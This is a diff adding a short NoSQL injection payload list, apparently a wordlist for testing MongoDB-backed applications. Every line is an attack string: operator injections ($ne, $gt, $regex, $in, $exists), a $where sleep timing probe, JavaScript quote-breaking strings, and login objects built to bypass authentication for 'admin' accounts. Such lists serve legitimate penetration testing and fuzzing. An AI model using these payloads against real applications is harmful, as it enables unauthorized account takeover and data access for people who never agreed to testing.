@@ -1,0 +1,27 @@
+# NoSQL Injection Payloads
+
+# MongoDB Operators
+{"$gt": ""}
+{"$ne": null}
+{"$ne": ""}
+{"$where": "sleep(5000)"}
+{"$regex": ".*"}
+{"$regex": "^a"}
+{"username": {"$regex": "^admin"}}
+{"password": {"$ne": ""}}
+{"$or": [{"a": 1}, {"b": 2}]}
+
+# Operator Injection
+' || '1'=='1
+' && '1'=='1
+true, $where: '1 == 1'
+'; return true; var foo='
+
+# JSON Injection
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+{"$where": "this.username == 'admin'"}
+
+# Authentication Bypass
+{"username": {"$in": ["admin", "Administrator"]}, "password": {"$ne": ""}}
+{"username": "admin", "password": {"$exists": true}}
